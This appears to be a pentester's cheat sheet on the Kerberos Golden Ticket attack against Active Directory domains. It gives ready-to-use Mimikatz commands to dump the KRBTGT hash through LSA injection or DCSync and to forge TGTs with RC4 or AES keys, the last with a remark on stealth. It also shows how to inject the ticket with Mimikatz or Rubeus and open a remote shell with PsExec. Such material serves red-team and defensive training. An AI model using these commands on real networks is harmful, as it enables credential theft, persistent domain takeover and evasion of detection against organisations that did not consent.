- Attack against the **KRBTGT account**, the master key for the entire domain
- Forge a  Ticket-Granting-Ticket (TGT) that provides **unlimited domain access**
- Works because the TGT is encrypted with the **KRBTGT account's password hash**

**KRBTGT Account:**

- It's a **default domain account** whose password hash is used to encrypt/sign all Kerberos TGTs.
- Whoever controls this hash **controls the domain**.

**Steps:**

1. Gain Domain Admin privileges to extract the KRBTGT account's NT hash from the Domain Controller
2. Use the KRBTGT hash to forge a TGT for any user, making them a member of any group
3. Use the forged TGT to request access to any service or resource in the domain
4. Gain persistent, total control over the entire domain forest

-  NTLM hash of the domain’s KDC service account (KRBTGT) to sign them.

The NTLM hash of the **krbtgt** account can be obtained via the following methods: 

1. DCSync (Mimikatz)
2. LSA (Mimikatz)
3. Hashdump (Meterpreter)
4. NTDS.DIT
5. DCSync (Kiwi)

**whoami /user** command or with the use of **PsGetsid** utility from [PsTools](https://download.sysinternals.com/files/PSTools.zip).

```sh


#Dump the sid and hash of krbtgt
lsadump::lsa /inject /name:krbtgt


#using  dcsync
lsadump::dcsync /user:krbtgt

#Metasploit could be an option

#Forge Golden ticket can be created with Mimikatz
kerberos::golden /user: /domain: /sid: /krbtgt: /id: 

# To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>

#inject ticket 
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>


#Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

**Note**: you may need to change the “ /Krbtgt:” to “/rc4:”. if you encountered any errors follow this official guide.

Shell access to the domain controller is also possible with the use of the **PsExec** utility.